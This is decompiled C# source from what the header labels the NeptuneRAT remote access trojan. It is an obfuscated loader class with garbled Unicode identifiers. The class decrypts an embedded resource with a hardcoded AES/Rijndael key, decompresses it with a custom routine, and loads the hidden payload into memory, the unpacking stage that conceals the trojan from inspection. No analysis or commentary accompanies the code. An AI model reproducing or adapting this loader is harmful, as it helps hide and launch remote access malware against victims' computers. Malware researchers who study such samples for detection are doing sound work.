// Decompiled with JetBrains decompiler
// Type: ⚔️MasonRAT✌؍؈ٺ؈̍؍گڣ؈ـ؋حڙ؈؊؏ـۜــ
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

#nullable disable
internal class \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ
{
  public const int \u06D9\u060Aــــب\u060Bـد؁ـۜـ\u060D\u060Aـبـڛ = null;
  public const int \u060A\u0609ڙ\u060Dڙ̍ــ\u060Aڙ̍\u0020 = null;
  public const int ﻋم\u0608\u060Eـ\u0609دـءڠ\u0608ڙ\u0608ؤ = null;
  public const int \u0609\u060Cٻۛۡڟۨــگ\u060Fح = null;
  public const int ـۙڣ\u0608ڼٻـط\u060Dـ\u060Fـۧ = null;
  private const int ڝح\u060Bحڙۙـﻻٻ\u0609ٺڠۧ\u0608؁ـــ\u060F = null;
  private const int \u060B\u060E\u0609\u060Cـــــۛٸ\u0608̍\u0608ـ\u060Bڣا\u060D = null;
  private const int دـى\u060Bٻ\u060Dىۜۛمٻگـ = null;
  private const int ـ\u0609ﻻ\u060C\u060D\u060Dڠٽ\u060B\u0608ڠٸ = null;
  public static Dictionary<string, string> دٻ\u060B\u060Dئڙ\u060Dڙ\u060Fـ\u0609ءـ\u060Fــ\u0608\u060Bٽ;
  public static string[] ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ;
  public static Assembly \u0608ۛڙـﻋــ\u0608ڼ̨ۨ\u060Eڝּ̍ؤٽ;
  public const int \u060C\u060F\u0609ــٺ\u060E\u060Bٻ\u0609ڦڅ\u060Bڙ = null;
  public const int \u0609ح̍ـ\u060Bۙ\u060Eــ\u0608ڙۙٸ\u060Aــ\u060Dحڙﻻـ = null;
  public const int ح\u0609ڙٸـ\u0609ـى\u0609ﻻۡ\u0608\u060Eـ\u060Aڕ\u060F = null;
  public const int ـمۡـم\u060Eڙڕـ\u060D\u060Fـۡــﻻ\u060Bگ\u060A = null;
  public const int \u060B\u060A\u060Aۡ\u060C\u060Fــڙ\u060Dٽـؤـ\u0609ؤ\u060F\u0608ـؤڙ = null;
  public const int \u06EDﻻــ\u060Aٺـۡﻋــ\u060Fּ̍ــۙۡىـ = null;
  public const int ڝۙد\u0609حب\u060Cـ\u060F\u0608ٺ\u060Dــ\u0609ڙٽ\u0609 = null;
  public const int ٸى\u060Cڙ\u060Eحـ\u060Aڙۚـ\u060Eــٺـ\u060B = null;
  private const int \u06D9ـــ\u0020ٽـ\u060Dـ\u060Aـــ = null;

  static \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ()
  {
    \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.\u0608\u0608\u060D\u060Aـب\u060Dـۙۙڙۧ();
    \u2694️MasonRAT\u270C\u0609\u0608بـطڞـ\u060A\u060A\u060E\u0608ٻﯧﻼ\u060Eۚ\u0609.ڙ\u060Bڼـ\u060Eټةْـ\u060Aڕ\u060Aٽ̍();
  }

  public static int ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A([In] int obj0) => obj0;

  public static int ــڣټڙح\u0608ــ\u060Dـٸټ([In] int obj0) => obj0;

  internal static void \u0608\u0608\u060D\u060Aـب\u060Dـۙۙڙۧ()
  {
    Stream manifestResourceStream = typeof (\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ).Assembly.GetManifestResourceStream("ـڙۧـدـۛٺـۡ؉ۧڕڙ؊ڙـ؎ڙـﻻ.resources");
    byte[] buffer = new byte[manifestResourceStream.Length];
    manifestResourceStream.Read(buffer, 0, buffer.Length);
    Rijndael rijndael = Rijndael.Create();
    rijndael.Key = SHA256.Create().ComputeHash(BitConverter.GetBytes(24));
    rijndael.IV = new byte[16 /*0x10*/];
    rijndael.Mode = CipherMode.CBC;
    MemoryStream memoryStream = new MemoryStream();
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
    cryptoStream.Write(buffer, 0, buffer.Length);
    cryptoStream.FlushFinalBlock();
    byte[] array = memoryStream.ToArray();
    memoryStream.Close();
    cryptoStream.Close();
    \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.\u0608ۛڙـﻋــ\u0608ڼ̨ۨ\u060Eڝּ̍ؤٽ = Assembly.Load(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060Aٺـڼؤژۡٺـد\u0609ٽ\u060Eـڼـ(array, 1));
    AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ژﻋ\u0020اىٽٻۛﻋ\u0020\u060Aﯧڟڛـۙـ\u060F\u060C);
  }

  public static Assembly ژﻋ\u0020اىٽٻۛﻋ\u0020\u060Aﯧڟڛـۙـ\u060F\u060C(
    [In] object obj0,
    [In] ResolveEventArgs obj1)
  {
    return \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.\u0608ۛڙـﻋــ\u0608ڼ̨ۨ\u060Eڝּ̍ؤٽ.FullName == obj1.Name ? \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.\u0608ۛڙـﻋــ\u0608ڼ̨ۨ\u060Eڝּ̍ؤٽ : (Assembly) null;
  }

  public static int \u060D\u060Cﮪـ؁\u060A\u060Dـ\u060E\u0608ڠـ([In] byte[] obj0)
  {
    return ((int) obj0[0] & 2) != 2 ? 3 : 9;
  }

  public static int \u0609څڣةٺــٺ\u0609ڦـ\u0609ڜى\u0609ـﯧٽـٽــ([In] byte[] obj0)
  {
    return \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.\u060D\u060Cﮪـ؁\u060A\u060Dـ\u060E\u0608ڠـ(obj0) == 9 ? (int) obj0[5] | (int) obj0[6] << 8 | (int) obj0[7] << 16 /*0x10*/ | (int) obj0[8] << 24 : (int) obj0[2];
  }

  public static byte[] ــ\u060Aٺـڼؤژۡٺـد\u0609ٽ\u060Eـڼـ([In] byte[] obj0, [In] int obj1)
  {
    byte[] second = new byte[1]{ (byte) obj1 };
    obj0 = ((IEnumerable<byte>) obj0).Concat<byte>((IEnumerable<byte>) second).ToArray<byte>();
    int length = \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.\u0609څڣةٺــٺ\u0609ڦـ\u0609ڜى\u0609ـﯧٽـٽــ(obj0);
    int index1 = \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.\u060D\u060Cﮪـ؁\u060A\u060Dـ\u060E\u0608ڠـ(obj0);
    int index2 = 0;
    uint num1 = 1;
    byte[] numArray1 = new byte[length];
    int[] numArray2 = new int[4096 /*0x1000*/];
    byte[] numArray3 = new byte[4096 /*0x1000*/];
    int num2 = length - 6 - 4 - 1;
    int index3 = -1;
    uint num3 = 0;
    int num4 = (int) obj0[0] >> 2 & 3;
    switch (num4)
    {
      case 1:
      case 3:
        if (((int) obj0[0] & 1) != 1)
        {
          byte[] destinationArray = new byte[length];
          Array.Copy((Array) obj0, \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.\u060D\u060Cﮪـ؁\u060A\u060Dـ\u060E\u0608ڠـ(obj0), (Array) destinationArray, 0, length);
          return destinationArray;
        }
        while (true)
        {
          if (num1 == 1U)
          {
            num1 = (uint) ((int) obj0[index1] | (int) obj0[index1 + 1] << 8 | (int) obj0[index1 + 2] << 16 /*0x10*/ | (int) obj0[index1 + 3] << 24);
            index1 += 4;
            if (index2 <= num2)
              num3 = num4 != 1 ? (uint) ((int) obj0[index1] | (int) obj0[index1 + 1] << 8 | (int) obj0[index1 + 2] << 16 /*0x10*/ | (int) obj0[index1 + 3] << 24) : (uint) ((int) obj0[index1] | (int) obj0[index1 + 1] << 8 | (int) obj0[index1 + 2] << 16 /*0x10*/);
          }
          if (((int) num1 & 1) == 1)
          {
            num1 >>= 1;
            uint index4;
            uint num5;
            if (num4 == 1)
            {
              int index5 = (int) num3 >> 4 & 4095 /*0x0FFF*/;
              index4 = (uint) numArray2[index5];
              if (((int) num3 & 15) != 0)
              {
                num5 = (uint) (((int) num3 & 15) + 2);
                index1 += 2;
              }
              else
              {
                num5 = (uint) obj0[index1 + 2];
                index1 += 3;
              }
            }
            else
            {
              uint num6;
              if (((int) num3 & 3) == 0)
              {
                num6 = (num3 & (uint) byte.MaxValue) >> 2;
                num5 = 3U;
                ++index1;
              }
              else if (((int) num3 & 2) == 0)
              {
                num6 = (num3 & (uint) ushort.MaxValue) >> 2;
                num5 = 3U;
                index1 += 2;
              }
              else if (((int) num3 & 1) == 0)
              {
                num6 = (num3 & (uint) ushort.MaxValue) >> 6;
                num5 = (uint) (((int) (num3 >> 2) & 15) + 3);
                index1 += 2;
              }
              else if (((int) num3 & (int) sbyte.MaxValue) != 3)
              {
                num6 = num3 >> 7 & 131071U /*0x01FFFF*/;
                num5 = (uint) (((int) (num3 >> 2) & 31 /*0x1F*/) + 2);
                index1 += 3;
              }
              else
              {
                num6 = num3 >> 15;
                num5 = (uint) (((int) (num3 >> 7) & (int) byte.MaxValue) + 3);
                index1 += 4;
              }
              index4 = (uint) ((ulong) index2 - (ulong) num6);
            }
            numArray1[index2] = numArray1[(int) index4];
            numArray1[index2 + 1] = numArray1[(int) index4 + 1];
            numArray1[index2 + 2] = numArray1[(int) index4 + 2];
            for (int index6 = 3; (long) index6 < (long) num5; ++index6)
              numArray1[index2 + index6] = numArray1[(long) index4 + (long) index6];
            index2 += (int) num5;
            if (num4 == 1)
            {
              uint num7 = (uint) ((int) numArray1[index3 + 1] | (int) numArray1[index3 + 2] << 8 | (int) numArray1[index3 + 3] << 16 /*0x10*/);
              while ((long) index3 < (long) index2 - (long) num5)
              {
                ++index3;
                int index7 = ((int) (num7 >> 12) ^ (int) num7) & 4095 /*0x0FFF*/;
                numArray2[index7] = index3;
                numArray3[index7] = (byte) 1;
                num7 = (uint) ((ulong) (num7 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) numArray1[index3 + 3] << 16 /*0x10*/));
              }
              num3 = (uint) ((int) obj0[index1] | (int) obj0[index1 + 1] << 8 | (int) obj0[index1 + 2] << 16 /*0x10*/);
            }
            else
              num3 = (uint) ((int) obj0[index1] | (int) obj0[index1 + 1] << 8 | (int) obj0[index1 + 2] << 16 /*0x10*/ | (int) obj0[index1 + 3] << 24);
            index3 = index2 - 1;
          }
          else if (index2 <= num2)
          {
            numArray1[index2] = obj0[index1];
            ++index2;
            ++index1;
            num1 >>= 1;
            if (num4 == 1)
            {
              while (index3 < index2 - 3)
              {
                ++index3;
                int num8 = (int) numArray1[index3] | (int) numArray1[index3 + 1] << 8 | (int) numArray1[index3 + 2] << 16 /*0x10*/;
                int index8 = (num8 >> 12 ^ num8) & 4095 /*0x0FFF*/;
                numArray2[index8] = index3;
                numArray3[index8] = (byte) 1;
              }
              num3 = (uint) ((ulong) (num3 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) obj0[index1 + 2] << 16 /*0x10*/));
            }
            else
              num3 = (uint) ((ulong) (num3 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) obj0[index1 + 2] << 16 /*0x10*/) | (ulong) ((int) obj0[index1 + 3] << 24));
          }
          else
            break;
        }
        while (index2 <= length - 1)
        {
          if (num1 == 1U)
          {
            index1 += 4;
            num1 = 2147483648U /*0x80000000*/;
          }
          numArray1[index2] = obj0[index1];
          ++index2;
          ++index1;
          num1 >>= 1;
        }
        return numArray1;
      default:
        throw new ArgumentException("ObfuscatedByFreemasonry");
    }
  }
}
